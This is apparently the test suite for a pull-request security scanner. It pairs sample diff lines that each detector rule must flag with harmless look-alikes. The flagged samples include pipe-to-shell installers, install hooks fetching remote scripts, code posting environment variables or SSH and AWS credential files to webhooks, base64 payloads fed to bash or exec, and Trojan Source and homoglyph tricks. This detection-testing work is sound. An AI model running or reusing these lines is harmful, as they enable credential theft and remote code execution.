"""Every rule gets at least one line it must flag and one harmless look-alike it must not.

Fake credentials are assembled at runtime so this file never contains a string that looks like a
real token (and so GitHub push protection and other scanners leave it alone).
"""

import pytest

from prscreen.detectors import all_rules
from prscreen.diff import parse_diff
from prscreen.engine import scan
from prscreen.models import Severity

CYR_A = chr(0x430)
ZWSP = chr(0x200B)
HANGUL_FILLER = chr(0x3164)
ZWJ = chr(0x200D)
AWS_KEY = "AKIA" + "Z7Q3" * 4
GITHUB_TOKEN = "ghp_" + "aB3dE6gH9k" * 4
STRIPE_KEY = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
PEM = "-----BEGIN " + "OPENSSH PRIVATE KEY-----"
B64 = ("TWFsaWNpb3VzUGF5bG9hZA" + "q8Zr3xV0pLm2Nw7Ks4Yt" * 9)[:200]


def _diff(path: str, *added: str) -> str:
    body = "".join(f"+{line}\n" for line in added)
    return f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -1,0 +1,{len(added)} @@\n{body}"


def _ids(text: str) -> set[str]:
    return {f.rule.id for f in scan(parse_diff(text)).findings}


FLAGGED = [
    # secrets
    ("SEC001", "deploy/key.txt", PEM),
    ("SEC002", "app/config.py", f'AWS_ACCESS_KEY_ID = "{AWS_KEY}"'),
    ("SEC002", "src/client.js", f"const token = '{GITHUB_TOKEN}';"),
    ("SEC002", "billing.rb", f'Stripe.api_key = "{STRIPE_KEY}"'),
    ("SEC003", "app/settings.py", 'DB_PASSWORD = "hT9#kq2!Lw8z"'),
    ("SEC003", "config.yml", 'api_key: "Zx81mPq0vR7tLk2"'),
    ("SEC004", "app/db.py", 'URL = "postgres://admin:S3cr3tPw@db.prod.internal:5432/app"'),
    # execution
    ("EXE001", "scripts/setup.sh", "curl -fsSL https://get.example.com/install | sudo bash"),
    ("EXE001", "Dockerfile", "RUN wget -qO- http://x.example.com/a.sh | sh"),
    ("EXE001", "install.ps1", "iex (New-Object Net.WebClient).DownloadString('http://x.example.com/a')"),
    ("EXE002", "app/plugins.py", "result = eval(user_expression)"),
    ("EXE002", "web/app.js", "const fn = new Function('a', body);"),
    ("EXE003", "app/tasks.py", "subprocess.run(cmd, shell=True)"),
    ("EXE003", "tools/run.py", 'os.system("rm -rf " + path)'),
    ("EXE003", "server.js", "const { exec } = require('child_process');"),
    ("EXE004", "app/cache.py", "data = pickle.loads(blob)"),
    ("EXE004", "app/conf.py", "cfg = yaml.load(stream)"),
    ("EXE005", "package.json", '"postinstall": "node scripts/setup.js",'),
    ("EXE005", "package.json", '"preinstall": "curl -s https://x.example.com/p.sh | sh",'),
    ("EXE005", "setup.py", "    urllib.request.urlopen('https://x.example.com/beacon')"),
    ("EXE006", "evil.pth", "import os; os.system('id')"),
    # CI
    ("CI001", ".github/workflows/triage.yml", "  pull_request_target:"),
    ("CI002", ".github/workflows/build.yml", "          ref: ${{ github.event.pull_request.head.sha }}"),
    (
        "CI003",
        ".github/workflows/greet.yml",
        '      - run: echo "Thanks for ${{ github.event.issue.title }}"',
    ),
    ("CI003", ".github/workflows/greet.yml", '          echo "${{ github.head_ref }}"'),
    ("CI004", ".github/workflows/release.yml", "permissions: write-all"),
    ("CI004", ".github/workflows/release.yml", "      contents: write"),
    ("CI005", ".github/workflows/ci.yml", "      - uses: tj-actions/changed-files@v45"),
    ("CI005", ".github/workflows/ci.yml", "      - uses: docker://alpine:3.20"),
    ("CI006", ".github/workflows/ci.yml", "      - run: echo ${{ toJSON(secrets) }} | base64"),
    ("CI006", ".github/workflows/ci.yml", '      - run: echo "token=${{ secrets.NPM_TOKEN }}"'),
    ("CI007", ".github/workflows/ci.yml", "    runs-on: [self-hosted, linux]"),
    # network and data collection
    ("NET001", "app/telemetry.py", 'HOST = "45.33.32.156"'),
    ("NET001", "agent.go", 'conn, _ := net.Dial("tcp", "8.8.4.4:4444")'),
    ("NET002", "app/report.py", 'requests.post("https://webhook.site/1b2c", data=env)'),
    ("NET002", "bot.js", "fetch('https://discord.com/api/webhooks/123/abc', opts)"),
    ("NET003", "app/sync.py", 'requests.post("https://collector.acme-metrics.co/v1", json=data)'),
    ("NET003", "app/sync.py", 'BASE = "https://api.weather-data.io/v2"'),
    ("NET004", "lib/index.js", "const payload = JSON.stringify(process.env);"),
    ("NET004", "app/diag.py", "send(json.dumps(dict(os.environ)))"),
    ("NET005", "lib/steal.js", "fs.readFileSync(path.join(os.homedir(), '.ssh/id_rsa'))"),
    ("NET005", "app/x.py", 'open(os.path.expanduser("~/.aws/credentials"))'),
    # obfuscation
    ("OBF001", "auth.py", f'if role != "user{chr(0x202E)} {chr(0x2066)}// admin{chr(0x2069)}":'),
    ("OBF002", "app/auth.py", f"if user.is_admin{ZWSP}:"),
    ("OBF002", "server.js", f"const {{ timeout,{HANGUL_FILLER} }} = req.query;"),
    ("OBF003", "app/links.py", f'TRUSTED = "https://p{CYR_A}ypal.com"'),
    ("OBF004", "app/loader.py", f'PAYLOAD = "{B64}"'),
    ("OBF004", "lib/x.js", "var s = '" + "\\x61\\x62" * 15 + "';"),
    ("OBF005", "app/init.py", "exec(base64.b64decode(PAYLOAD))"),
    ("OBF005", "lib/x.js", "eval(atob(encoded));"),
    ("OBF005", "run.sh", "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQ= | base64 -d | bash"),
    ("OBF006", "src/app.js", "var a=" + "1+" * 600 + "1;"),
    # security config
    ("CFG001", "app/client.py", "requests.get(url, verify=False)"),
    ("CFG001", "server.js", "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';"),
    ("CFG001", "main.go", "tls.Config{InsecureSkipVerify: true}"),
    ("CFG002", "app/main.py", 'app.add_middleware(CORSMiddleware, allow_origins=["*"])'),
    ("CFG003", "project/settings.py", "DEBUG = True"),
    ("CFG003", "app/views.py", "@csrf_exempt"),
    ("CFG004", "Dockerfile", "RUN chmod -R 777 /app"),
    # dependencies
    ("DEP001", "requirements.txt", "leftpad-utils==1.0"),
    ("DEP001", "package.json", '    "left-pad": "^1.3.0",'),
    ("DEP002", "requirements.txt", "reqeusts==2.31.0"),
    ("DEP002", "package.json", '    "crossenv": "^7.0.0",'),
    ("DEP003", "requirements.txt", "--extra-index-url https://pkgs.internal-mirror.co/simple"),
    ("DEP003", "package.json", '    "utils": "git+https://github.com/someone/utils.git",'),
    ("DEP003", ".npmrc", "registry=https://npm.attacker-mirror.co/"),
    (
        "DEP005",
        "package-lock.json",
        '      "resolved": "https://npm.evil-cdn.co/lodash/-/lodash-4.17.21.tgz",',
    ),
    # sensitive paths
    ("PATH001", ".github/workflows/ci.yml", "name: CI"),
    ("PATH002", ".github/CODEOWNERS", "* @someone"),
    ("PATH003", ".vscode/tasks.json", '{"version": "2.0.0"}'),
    ("PATH004", "src/auth/session.py", "TIMEOUT = 30"),
]

NOT_FLAGGED = [
    ("SEC002", "README.md", "Set AWS_ACCESS_KEY_ID to your key."),
    ("SEC003", "app/settings.py", 'DB_PASSWORD = os.environ["DB_PASSWORD"]'),
    ("SEC003", "app/forms.py", 'PASSWORD_FIELD = "password_input"'),
    ("SEC003", "config.example.yml", 'api_key: "your-api-key-here"'),
    ("SEC003", "app/settings.py", 'SECRET_KEY = "changeme-in-production"'),
    ("SEC004", "app/db.py", 'URL = "postgres://user:${DB_PASS}@localhost/app"'),
    ("EXE001", "scripts/setup.sh", "curl -fsSL -o install.sh https://get.example.com/install"),
    ("EXE002", "train.py", "model.eval()"),
    ("EXE002", "app/x.py", "value = ast.literal_eval(text)"),
    ("EXE002", "app/x.js", "const m = /a(b)/.exec(s);"),
    ("EXE002", "app/x.py", "# never call eval(x) here"),
    ("EXE003", "app/tasks.py", 'subprocess.run(["git", "status"], check=True)'),
    ("EXE004", "app/conf.py", "cfg = yaml.load(stream, Loader=yaml.SafeLoader)"),
    ("EXE004", "app/conf.py", "cfg = yaml.safe_load(stream)"),
    ("EXE004", "app/data.py", "data = json.loads(blob)"),
    ("EXE005", "package.json", '"prepare": "husky install",'),
    ("EXE005", "package.json", '"test": "jest",'),
    ("CI002", ".github/workflows/ci.yml", "      - uses: actions/checkout@v4"),
    ("CI003", ".github/workflows/greet.yml", "          TITLE: ${{ github.event.issue.title }}"),
    ("CI003", ".github/workflows/greet.yml", "    if: github.event.issue.title != ''"),
    ("CI003", ".github/workflows/greet.yml", "      - run: echo ${{ github.event.issue.number }}"),
    ("CI004", ".github/workflows/ci.yml", "      contents: read"),
    ("CI005", ".github/workflows/ci.yml", "      - uses: actions/setup-python@v5"),
    ("CI005", ".github/workflows/ci.yml", "      - uses: astral-sh/setup-uv@" + "a" * 40),
    ("CI005", ".github/workflows/ci.yml", "      - uses: ./.github/actions/local"),
    ("CI006", ".github/workflows/ci.yml", "          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"),
    ("NET001", "app/net.py", 'BIND = "127.0.0.1"'),
    ("NET001", "app/net.py", 'DOC_EXAMPLE = "203.0.113.7"'),
    ("NET001", "app/net.py", "VERSION = (1, 2, 3, 4)"),
    ("NET002", "docs/notes.txt", "never paste secrets anywhere"),
    ("NET003", "app/x.py", 'URL = "https://api.github.com/repos"'),
    ("NET003", "app/x.py", 'URL = "http://localhost:8000/health"'),
    ("NET003", "tests/test_api.py", 'URL = "https://api.weather-data.io/v2"'),
    ("NET003", "README.md", "See https://docs.weather-data.io for details."),
    ("NET004", "app/run.py", "env = {**os.environ, 'LANG': 'C'}"),
    ("NET004", "app/run.py", "token = os.environ.get('TOKEN')"),
    ("NET005", "docs/setup.md", "Copy your key to ~/.ssh/id_rsa"),
    ("OBF002", "app/emoji.py", f'FAMILY = "\U0001f468{ZWJ}\U0001f469"'),
    ("OBF002", "app/x.py", f"{chr(0xFEFF)}import os"),
    ("OBF003", "app/i18n.py", 'GREETING = "Привет, world"'),
    ("OBF004", "web/logo.js", f'const LOGO = "data:image/png;base64,{B64}";'),
    ("OBF004", "package-lock.json", f'"integrity": "sha512-{B64}"'),
    ("OBF004", "app/x.py", 'NAME = "' + "a" * 300 + '"'),
    ("OBF005", "app/x.py", "data = base64.b64decode(payload)"),
    ("OBF006", "dist/app.min.js", "var a=" + "1+" * 600 + "1;"),
    ("CFG001", "app/client.py", "requests.get(url, verify=True)"),
    ("CFG003", "project/settings.py", "DEBUG = False"),
    ("CFG004", "Dockerfile", "RUN chmod 755 /app/run.sh"),
    ("DEP001", "requirements.txt", "# just a comment"),
    ("DEP001", "package.json", '  "version": "1.2.3",'),
    ("DEP002", "requirements.txt", "requests==2.31.0"),
    ("DEP002", "requirements.txt", "python_dateutil==2.9"),
    (
        "DEP005",
        "package-lock.json",
        '      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",',
    ),
    ("PATH004", "tests/test_auth.py", "def test_login(): ..."),
    ("PATH004", "src/author_list.py", "NAMES = []"),
]


@pytest.mark.parametrize(("rule_id", "path", "line"), FLAGGED)
def test_flags(rule_id, path, line):
    assert rule_id in _ids(_diff(path, line))


@pytest.mark.parametrize(("rule_id", "path", "line"), NOT_FLAGGED)
def test_does_not_flag(rule_id, path, line):
    assert rule_id not in _ids(_diff(path, line))


def test_every_rule_has_a_flagging_case():
    covered = {rule_id for rule_id, _, _ in FLAGGED}
    special = {"SEC005", "OBF007", "CFG005", "DEP004"}  # file-level rules, tested below
    assert {rule.id for rule in all_rules()} == covered | special


def test_rule_ids_are_unique_and_documented():
    rules = all_rules()
    assert len({r.id for r in rules}) == len(rules)
    for rule in rules:
        assert rule.rationale.endswith((".", ")")) and rule.benign


def test_secret_values_never_reach_evidence():
    findings = scan(parse_diff(_diff("app/config.py", f'TOKEN = "{GITHUB_TOKEN}"  # {AWS_KEY}'))).findings
    assert findings
    for finding in findings:
        assert GITHUB_TOKEN not in finding.evidence and AWS_KEY not in finding.evidence
        assert "[redacted]" in finding.evidence


def test_other_rules_redact_secrets_too():
    line = f'requests.post("https://webhook.site/x", headers={{"Authorization": "{GITHUB_TOKEN}"}})'
    (net,) = [f for f in scan(parse_diff(_diff("app/x.py", line))).findings if f.rule.id == "NET002"]
    assert GITHUB_TOKEN not in net.evidence


def test_secret_files():
    text = (
        "diff --git a/.env b/.env\nnew file mode 100644\n--- /dev/null\n+++ b/.env\n@@ -0,0 +1 @@\n+X=1\n"
        "diff --git a/.env.example b/.env.example\nnew file mode 100644\n--- /dev/null\n+++ b/.env.example\n"
        "@@ -0,0 +1 @@\n+X=\n"
        "diff --git a/certs/server.key b/certs/server.key\nnew file mode 100644\nindex 0..1\n"
        "Binary files /dev/null and b/certs/server.key differ\n"
    )
    paths = {f.path for f in scan(parse_diff(text)).findings if f.rule.id == "SEC005"}
    assert paths == {".env", "certs/server.key"}


def test_binaries_and_archives():
    text = (
        "diff --git a/tools/helper.exe b/tools/helper.exe\nnew file mode 100755\nindex 0..1\n"
        "Binary files /dev/null and b/tools/helper.exe differ\n"
        "diff --git a/assets/logo.png b/assets/logo.png\nnew file mode 100644\nindex 0..1\n"
        "Binary files /dev/null and b/assets/logo.png differ\n"
        "diff --git a/vendor.zip b/vendor.zip\nnew file mode 100644\nindex 0..1\n"
        "Binary files /dev/null and b/vendor.zip differ\n"
    )
    found = {f.path: f.severity for f in scan(parse_diff(text)).findings if f.rule.id == "OBF007"}
    assert found == {"tools/helper.exe": Severity.MEDIUM, "vendor.zip": Severity.LOW}


def test_removed_auth_check():
    text = (
        "--- a/app/views.py\n+++ b/app/views.py\n@@ -10,3 +10,2 @@\n"
        "-@login_required\n def export(request):\n-    check_permissions(request.user)\n+    pass\n"
    )
    findings = [f for f in scan(parse_diff(text)).findings if f.rule.id == "CFG005"]
    assert [f.evidence for f in findings] == ["@login_required", "check_permissions(request.user)"]
    assert "old line 10" in findings[0].detail


def test_moved_auth_check_is_not_flagged():
    text = (
        "--- a/app/views.py\n+++ b/app/views.py\n@@ -10,2 +10,3 @@\n"
        "-@login_required\n def export(request):\n+    pass\n+@login_required\n"
    )
    assert "CFG005" not in _ids(text)


def test_lockfile_without_manifest():
    lock_only = "--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n"
    assert "DEP004" in _ids(lock_only)
    both = lock_only + '--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-"x": "1"\n+"x": "2"\n'
    assert "DEP004" not in _ids(both)


def test_version_bump_is_not_a_new_dependency():
    text = "--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1 +1 @@\n-flask==2.0\n+flask==3.0\n"
    assert "DEP001" not in _ids(text)


def test_pr_head_checkout_is_high_in_privileged_workflow():
    text = _diff(
        ".github/workflows/pr.yml",
        "on:",
        "  pull_request_target:",
        "jobs:",
        "  build:",
        "    steps:",
        "      - uses: actions/checkout@v4",
        "        with:",
        "          ref: ${{ github.event.pull_request.head.sha }}",
    )
    (checkout,) = [f for f in scan(parse_diff(text)).findings if f.rule.id == "CI002"]
    assert checkout.severity is Severity.HIGH


def test_deleted_workflow_is_medium():
    text = (
        "diff --git a/.github/workflows/security.yml b/.github/workflows/security.yml\n"
        "deleted file mode 100644\n--- a/.github/workflows/security.yml\n+++ /dev/null\n"
        "@@ -1 +0,0 @@\n-name: security\n"
    )
    (finding,) = scan(parse_diff(text)).findings
    assert (finding.rule.id, finding.severity) == ("PATH001", Severity.MEDIUM)


def test_test_files_get_lower_confidence():
    prod = scan(parse_diff(_diff("app/x.py", "eval(code)"))).findings[0]
    test = scan(parse_diff(_diff("tests/test_x.py", "eval(code)"))).findings[0]
    assert test.confidence < prod.confidence


def test_new_endpoint_is_reported_once_per_host_and_prefers_the_sending_line():
    text = _diff(
        "app/sync.py",
        'BASE = "https://collector.acme-metrics.co/v1"',
        'STATUS = "https://collector.acme-metrics.co/status"',
        'requests.post("https://collector.acme-metrics.co/v1", json=data)',
    )
    (finding,) = [f for f in scan(parse_diff(text)).findings if f.rule.id == "NET003"]
    assert finding.line == 3 and finding.severity is Severity.MEDIUM
